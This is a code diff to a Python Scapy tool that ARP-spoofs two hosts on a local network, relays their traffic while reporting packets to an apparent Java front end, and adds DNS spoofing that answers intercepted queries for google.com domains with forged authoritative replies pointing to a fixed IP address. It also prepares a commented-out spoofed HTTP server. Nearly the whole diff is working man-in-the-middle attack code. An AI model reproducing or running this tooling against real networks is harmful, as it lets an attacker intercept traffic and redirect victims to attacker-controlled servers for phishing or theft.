@@ -2,15 +2,18 @@ import sys
 import json
 import threading
 import time
-from scapy.all import IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP, ICMP
+from scapy.all import IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, get_if_addr
 import copy
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
 targets = []
 is_running = True
 lock = threading.Lock()
 
-attacker_mac = get_if_hwaddr(conf.iface)
+dns_targets = ["google.com"]
 
+attacker_mac = get_if_hwaddr(conf.iface)
+attacker_ip = get_if_addr(conf.iface)
 # Cache to store resolved IP-MAC pairs
 mac_cache = {}
 
@@ -38,15 +41,48 @@ def send_packet_info(packet):
 
                 # Check if destination mac address is the user's mac address:
                 if dst == attacker_mac:
-                    if src == mac1:
-                        print_package_in_json(packet)  # Let java know of the packet
-                        redirect_package(mac1, packet)
-                        break
 
-                    elif src == mac2:
-                        print_package_in_json(packet)  # Let java know of the packet
-                        redirect_package(mac2, packet)
-                        break
+                    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
+                        domain = packet[DNSQR].qname.decode().rstrip('.').lower()
+                        if any(domain.endswith(target) for target in dns_targets):
+                            newpacket = copy.deepcopy(packet)
+                            ip = IP(src=newpacket[IP].dst, dst=newpacket[IP].src)  # DNS server IP to client IP
+                            udp = UDP(sport=53, dport=newpacket[UDP].sport)   # Sport = 53 (DNS), Dport = client's source port
+
+                            dns = DNS(
+                                id=newpacket[DNS].id,         # Transaction ID (must match the query)
+                                qr=1,              # This is a response
+                                aa=1,              # Authoritative Answer
+                                qdcount=1,
+                                ancount=1,
+                                qd=newpacket[DNS].qd,
+                                an=DNSRR(rrname=domain, ttl=300, rdata='34.36.121.47')
+                            )
+
+                            newpacket = ip / udp / dns
+                            send(newpacket, iface=conf.iface, verbose=False)
+
+                            break
+                        else:
+
+                            if src == mac1:
+                                print_package_in_json(packet)  # Let java know of the packet
+                                redirect_package(mac1, packet)
+                                break
+
+                            elif src == mac2:
+                                print_package_in_json(packet)  # Let java know of the packet
+                                redirect_package(mac2, packet)
+                                break
+                    else:
+                        if src == mac1:
+                            print_package_in_json(packet)  # Let java know of the packet
+                            redirect_package(mac2, packet)
+                            break
+                        elif src == mac2:
+                            print_package_in_json(packet)  # Let java know of the packet
+                            redirect_package(mac1, packet)
+                            break
 
 
 # Creates a new packet with the attacker's mac address
@@ -145,6 +181,7 @@ def main():
 
     threading.Thread(target=spoof_loop, daemon=True).start()
     threading.Thread(target=sniff_thread, daemon=True).start()
+    # threading.Thread(target=run_spoofed_http_server, daemon=True).start()
 
     for line in sys.stdin:
         handle_command(line.strip())
